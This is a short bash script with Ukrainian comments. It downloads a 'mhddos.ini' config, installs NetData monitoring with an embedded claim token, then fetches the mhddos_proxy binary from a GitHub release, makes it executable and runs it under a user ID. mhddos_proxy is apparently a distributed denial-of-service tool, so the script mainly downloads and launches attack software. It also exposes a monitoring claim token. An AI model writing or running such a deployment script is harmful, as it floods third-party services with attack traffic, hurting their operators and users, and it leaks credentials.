#!/bin/bash

# Завантаження файлу mhddos.ini
curl -o mhddos.ini https://github.com/jobbern693/mhtetsteest3/blob/main/mhddos.ini && \

# Встановлення NetData без підтвердження
curl https://get.netdata.cloud/kickstart.sh > /tmp/netdata-kickstart.sh && \
sh /tmp/netdata-kickstart.sh --stable-channel --claim-token kQu4ubwd1Rv35nYTCXI2tICAeo2M97uLzQMfVQuxuE60SqtFuE1Vm6OV58QYc0xjmHrCTSfaSbBQE8DUJeU7RpzVCg334R0_aYjgsBMt7f42eEuL7BwMyFwRSfJvSvwrALGiBxg --claim-rooms 97128b92-3bf3-4e43-bfc8-b23ea2767bc9 --claim-url https://app.netdata.cloud && \

# Перезапуск NetData
sudo service netdata restart && \

# Завантаження mhddos_proxy
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux && \

# Зміна прав доступу на виконуваний файл
chmod +x mhddos_proxy_linux && \

# Запуск mhddos_proxy
./mhddos_proxy_linux --user-id 1299004116
